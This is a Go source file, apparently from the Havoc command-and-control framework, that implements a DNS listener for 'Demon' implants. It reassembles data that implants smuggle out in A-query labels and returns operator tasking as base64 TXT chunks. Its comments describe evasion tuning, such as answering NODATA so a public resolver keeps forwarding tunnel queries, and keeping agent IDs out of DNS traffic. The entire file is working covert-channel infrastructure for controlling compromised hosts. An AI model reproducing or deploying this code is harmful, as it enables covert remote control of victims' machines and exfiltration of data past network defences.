package handlers

import (
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"sync"

	"Havoc/pkg/agent"
	"Havoc/pkg/logger"

	"github.com/miekg/dns"
)

// dnsSession tracks partial uplink chunk reassembly for a pending packet.
type dnsSession struct {
	chunks   map[int][]byte
	total    int
	received int
}

// DNS is the DNS C2 listener handler.
// It binds a miekg/dns server on UDP and TCP, reassembles uplink A-query
// chunks into AuthWireBuffer payloads, feeds them to parseAgentRequest, and
// serves the queued response as base64-encoded TXT chunks on downlink polls.
type DNS struct {
	Config     DNSConfig
	Teamserver agent.TeamServer

	server *dns.Server

	mu        sync.Mutex
	pending   map[string]*dnsSession // key: seq4+tok8 hex
	responses map[string][]byte      // key: tok8 hex → queued encrypted response
}

// tokenKey returns the map key for a response keyed by the per-session token.
// The token is derived from the Demon's AES key — stable across chunks of one
// session, unique per implant instance, and never exposes the agent ID in DNS.
func tokenKey(tok uint32) string {
	return fmt.Sprintf("%08x", tok)
}

// sessionKey returns the reassembly map key for a pending uplink (seq + token).
func sessionKey(seq uint16, tok uint32) string {
	return fmt.Sprintf("%04x%08x", seq, tok)
}

// Start binds the DNS server on both UDP and TCP.
func (d *DNS) Start() error {
	d.pending = make(map[string]*dnsSession)
	d.responses = make(map[string][]byte)

	mux := dns.NewServeMux()
	// Register handler for the configured zone (trailing dot = FQDN convention)
	mux.HandleFunc(strings.ToLower(d.Config.ZoneDomain)+".", d.ServeDNS)

	addr := fmt.Sprintf("%s:%d", d.Config.HostBind, d.Config.Port)

	udpSrv := &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	tcpSrv := &dns.Server{Addr: addr, Net: "tcp", Handler: mux}

	go func() {
		if err := udpSrv.ListenAndServe(); err != nil {
			logger.Error(fmt.Sprintf("DNS [%s] UDP: %s", d.Config.Name, err.Error()))
		}
	}()
	go func() {
		if err := tcpSrv.ListenAndServe(); err != nil {
			logger.Error(fmt.Sprintf("DNS [%s] TCP: %s", d.Config.Name, err.Error()))
		}
	}()

	d.server = udpSrv
	logger.Info(fmt.Sprintf("DNS listener '%s' started on %s zone %s",
		d.Config.Name, addr, d.Config.ZoneDomain))

	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
	d.Teamserver.EventAppend(pk)
	d.Teamserver.EventBroadcast("", pk)

	return nil
}

// dnsTypeName returns a human-readable DNS query type string.
func dnsTypeName(qtype uint16) string {
	switch qtype {
	case dns.TypeA:
		return "A"
	case dns.TypeTXT:
		return "TXT"
	case dns.TypeAAAA:
		return "AAAA"
	case dns.TypeMX:
		return "MX"
	case dns.TypeNS:
		return "NS"
	case dns.TypeSOA:
		return "SOA"
	case dns.TypePTR:
		return "PTR"
	default:
		return fmt.Sprintf("type%d", qtype)
	}
}

// ServeDNS implements dns.Handler and is called for every DNS query
// received by both the UDP and TCP servers.
func (d *DNS) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	remoteAddr := w.RemoteAddr().String()
	remoteIP := remoteAddr
	if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
		remoteIP = host
	}

	for _, q := range r.Question {
		name := strings.ToLower(q.Name)
		logger.Debug(fmt.Sprintf("DNS query: type=%-4s from=%s name=%s",
			dnsTypeName(q.Qtype), remoteIP, name))

		switch q.Qtype {
		case dns.TypeA:
			rr := d.handleUplink(q, name, remoteIP)
			if rr != nil {
				m.Answer = append(m.Answer, rr)
			} else {
				// Return NODATA (NOERROR, empty answer) instead of NXDOMAIN for
				// queries that don't match our 3-label uplink format. NXDOMAIN would
				// trigger RFC 8020 NXDOMAIN-cut synthesis in Cloudflare's recursive
				// resolver (1.1.1.1), which caches the NXDOMAIN for the token label
				// (e.g. <tok8>.zone.forsec.pw.) and then synthesises NXDOMAIN for all
				// sub-labels (<b32>.<meta8>.<tok8>.zone.forsec.pw.) without querying us.
				// NODATA tells the resolver the name EXISTS but has no A record, so
				// RFC 8020 cut does not apply and subsequent sub-label queries are
				// forwarded to us normally.
				logger.Debug(fmt.Sprintf("DNS query: type=A name=%s → NODATA (parse failed, suppressing NXDOMAIN)", name))
			}
		case dns.TypeTXT:
			rr := d.handleDownlink(q, name)
			if rr != nil {
				m.Answer = append(m.Answer, rr)
			}
			// empty answer = "no data ready" — Demon retries on next cycle
		default:
			// Return NODATA for unsupported types (NS, AAAA, SOA, etc.) for the same
			// RFC 8020 reason: NXDOMAIN on a parent label blocks all sub-label queries.
			logger.Debug(fmt.Sprintf("DNS query: type=%s name=%s → NODATA (unsupported type)",
				dnsTypeName(q.Qtype), name))
		}
	}

	_ = w.WriteMsg(m)
}

// handleUplink processes a single uplink A-query chunk.
// When all chunks for a packet are received, the reassembled payload is fed
// to parseAgentRequest and the encrypted response is queued for downlink.
// Returns an A RR ACK (0.0.0.1) on success, nil on invalid queries (→ NXDOMAIN).
func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
	chunk, seq, cid, tot, tok, err := dnsParseUploadFqdn(name, d.Config.ZoneDomain)
	if err != nil {
		logger.Debug(fmt.Sprintf("DNS uplink parse error: %s (name=%s)", err.Error(), name))
		return nil
	}

	if int(tot) == 0 {
		logger.Debug(fmt.Sprintf("DNS uplink: tot=0 is invalid (name=%s)", name))
		return nil
	}

	sKey := sessionKey(seq, tok)
	tKey := tokenKey(tok)

	logger.Debug(fmt.Sprintf("DNS uplink: seq=%04x cid=%02x tot=%02x tok=%08x chunk_len=%d sKey=%s tKey=%s",
		seq, cid, tot, tok, len(chunk), sKey, tKey))

	d.mu.Lock()
	sess, ok := d.pending[sKey]
	if !ok {
		sess = &dnsSession{
			chunks: make(map[int][]byte),
			total:  int(tot),
		}
		d.pending[sKey] = sess
		logger.Debug(fmt.Sprintf("DNS uplink: new session sKey=%s tot=%d", sKey, tot))
	}
	if _, dup := sess.chunks[int(cid)]; !dup {
		sess.chunks[int(cid)] = chunk
		sess.received++
		logger.Debug(fmt.Sprintf("DNS uplink: sKey=%s chunk cid=%02x stored, progress=%d/%d",
			sKey, cid, sess.received, sess.total))
	} else {
		logger.Debug(fmt.Sprintf("DNS uplink: sKey=%s chunk cid=%02x duplicate, ignored", sKey, cid))
	}
	complete := sess.received >= sess.total
	var fullPayload []byte
	if complete {
		for i := 0; i < sess.total; i++ {
			fullPayload = append(fullPayload, sess.chunks[i]...)
		}
		delete(d.pending, sKey)
		logger.Debug(fmt.Sprintf("DNS uplink: sKey=%s complete, total_bytes=%d, passing to parseAgentRequest",
			sKey, len(fullPayload)))
	}
	d.mu.Unlock()

	if complete {
		resp, ok := parseAgentRequest(d.Teamserver, fullPayload, remoteIP, true, d.Config.Name)
		if ok && resp.Len() > 0 {
			d.mu.Lock()
			d.responses[tKey] = resp.Bytes()
			d.mu.Unlock()
			logger.Debug(fmt.Sprintf("DNS uplink: response queued tKey=%s resp_len=%d", tKey, resp.Len()))
		} else {
			logger.Debug(fmt.Sprintf("DNS uplink: parseAgentRequest ok=%v resp_len=%d — no response queued for tKey=%s",
				ok, resp.Len(), tKey))
		}
	}

	// ACK every chunk (complete or partial) with 0.0.0.1
	return &dns.A{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		A: net.IPv4(0, 0, 0, 1),
	}
}

// handleDownlink processes a downlink TXT-poll query.
// It slices the queued response at the requested byte offset and returns it
// as a base64-encoded TXT string. The last chunk is prefixed with 0xFF so
// the Demon knows the response is complete. An empty TXT answer signals
// "no data ready" and the Demon retries.
func (d *DNS) handleDownlink(q dns.Question, name string) dns.RR {
	seq, offset, tok, err := dnsParseDownlinkFqdn(name, d.Config.ZoneDomain)
	if err != nil {
		logger.Debug(fmt.Sprintf("DNS downlink parse error: %s (name=%s)", err.Error(), name))
		return nil
	}

	tKey := tokenKey(tok)

	d.mu.Lock()
	resp, respFound := d.responses[tKey]
	respLen := len(resp)
	d.mu.Unlock()

	logger.Debug(fmt.Sprintf("DNS downlink poll: seq=%04x offset=%08x tok=%08x tKey=%s found=%v resp_len=%d",
		seq, offset, tok, tKey, respFound, respLen))

	if !respFound || respLen == 0 {
		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s no data queued — returning empty TXT", tKey))
		return &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{},
		}
	}

	start := int(offset)
	if start >= respLen {
		// Offset past end — all data already served; send sentinel
		d.mu.Lock()
		delete(d.responses, tKey)
		d.mu.Unlock()
		sentinel := base64.StdEncoding.EncodeToString([]byte{0xFF})
		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s offset=%d >= resp_len=%d — sending sentinel, deleting response",
			tKey, start, respLen))
		return &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{sentinel},
		}
	}

	end := start + dnsTXTChunkSize
	last := end >= respLen
	if last {
		end = respLen
	}

	chunk := resp[start:end]
	var encoded string
	if last {
		// Prepend 0xFF sentinel so Demon recognises end-of-response
		withSentinel := make([]byte, 1+len(chunk))
		withSentinel[0] = 0xFF
		copy(withSentinel[1:], chunk)
		encoded = base64.StdEncoding.EncodeToString(withSentinel)

		d.mu.Lock()
		delete(d.responses, tKey)
		d.mu.Unlock()
		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s offset=%d..%d LAST chunk (%d bytes + sentinel), encoded_len=%d — deleting response",
			tKey, start, end, len(chunk), len(encoded)))
	} else {
		encoded = base64.StdEncoding.EncodeToString(chunk)
		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s offset=%d..%d chunk (%d bytes), encoded_len=%d",
			tKey, start, end, len(chunk), len(encoded)))
	}

	return &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		Txt: []string{encoded},
	}
}
